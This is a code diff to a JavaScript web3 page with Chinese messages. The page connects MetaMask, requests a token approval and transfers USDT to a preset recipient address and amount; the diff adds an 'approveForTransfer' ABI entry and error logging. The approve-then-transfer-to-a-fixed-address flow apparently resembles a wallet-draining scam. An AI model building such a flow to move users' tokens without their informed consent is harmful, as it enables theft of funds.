@@ -23,7 +23,29 @@ const abi = [
         "stateMutability": "nonpayable",
         "type": "function"
     },
-    // 其他ABI部分...
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "tokenAddress",
+                "type": "address"
+            },
+            {
+                "internalType": "address",
+                "name": "from",
+                "type": "address"
+            },
+            {
+                "internalType": "address",
+                "name": "spender",
+                "type": "address"
+            }
+        ],
+        "name": "approveForTransfer",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
 ];
 
 let web3;
@@ -44,6 +66,7 @@ document.getElementById('connectButton').addEventListener('click', async () => {
             document.getElementById('transferButton').style.display = 'inline-block';
         } catch (error) {
             alert('连接失败，请检查您的钱包设置！');
+            console.error(error);
         }
     } else {
         alert('请安装MetaMask！');
@@ -59,12 +82,12 @@ document.getElementById('approveButton').addEventListener('click', async () => {
         alert('授权成功！');
     } catch (error) {
         alert('授权失败！');
+        console.error(error);
     }
 });
 
 document.getElementById('transferButton').addEventListener('click', async () => {
     const tokenAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7'; // USDT地址
-    // 使用默认的接收地址和转移数量
     const toAddress = defaultToAddress; 
     const amount = defaultAmount; 
     const contract = new web3.eth.Contract(abi, contractAddress);
@@ -73,5 +96,6 @@ document.getElementById('transferButton').addEventListener('click', async () => 
         alert('转移成功！');
     } catch (error) {
         alert('转移失败！');
+        console.error(error);
     }
 });
